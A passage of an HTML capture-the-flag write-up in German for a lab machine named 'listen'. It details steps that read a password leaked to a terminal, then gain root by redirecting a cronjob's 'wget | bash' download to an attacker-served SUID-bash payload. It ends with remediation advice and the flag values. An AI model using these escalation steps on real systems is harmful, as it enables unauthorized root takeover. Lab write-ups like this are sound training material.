+                <li>Finde `listen.sh`, das `/home/listen/password.txt` nach `/dev/pts/4` schreibt.</li>
+                <li>Identifiziere TTYs mit `w`.</li>
+                <li>Lese Passwort für `listen` (`shhhhhh`) aus `/dev/pts/4`, wenn `listen.sh` ausgeführt wird.</li>
+                <li>Wechsle Benutzer: `su listen`.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Shell als `listen`.</p>
+
+            <h3>POC Schritt 3: Privilege Escalation (listen -> root via Cronjob Hijack)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> Cronjob führt `wget http://listen/ihearyou.sh | bash` als root aus.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `listen`, Möglichkeit zur Umleitung von DNS für `listen` auf Angreifer-IP.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Erstelle Payload `ihearyou.sh` auf Angreifer-System (`cp /bin/bash /tmp/bashroot; chmod +s /tmp/bashroot`).</li>
+                <li>Starte HTTP-Server auf Angreifer-System auf Port 80 (`python3 -m http.server 80`).</li>
+                <li>Manipuliere DNS-Auflösung für `listen` auf Zielsystem, sodass es auf Angreifer-IP zeigt (z.B. `/etc/hosts` bearbeiten: `[ANGREIFER_IP] listen`).</li>
+                <li>Warte, bis der Cronjob die Datei herunterlädt und ausführt.</li>
+                <li>Führe als `listen` die SUID-Shell aus: `cd /tmp; ./bashroot -p`.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Root-Shell.</p>
+            <p class="analysis"><strong>Beweismittel:</strong> Ausführung von `id` zeigt `euid=0(root)`. Lesen von `/root/root.txt` ist möglich.</p>
+
+            <p class="evaluation"><strong>Risikobewertung:</strong> Sehr hoch. Mehrere Schwachstellen, darunter Informationslecks, schwache Passwörter, unsichere Skripte und ein kritischer Cronjob-Hijacking-Vektor, ermöglichen die vollständige Kompromittierung des Systems.</p>
+            <p class="recommendation"><strong>Empfehlungen:**
+*   **Admin:** Hash von Webseite entfernen. Starke Passwörter erzwingen. Unsichere Skripte (`listen.sh`, `listentome.sh`) entfernen/absichern. Cronjob sicher gestalten (kein `wget | bash`, sichere Quelle, minimale Rechte). DNS/Hosts-Datei schützen. SUID-Binaries überprüfen (`poem`).
+*   **Pentester:** Alle Eskalationspfade dokumentieren, insbesondere den Cronjob-Vektor.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/listen/user.txt</div> <!-- Korrekter Benutzer -->
+                     <div class="flag-value"><span class="password">HMVimlistening</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMVthxforlisten</span></div>
+                 </div>
+             </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 5. November 2022</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
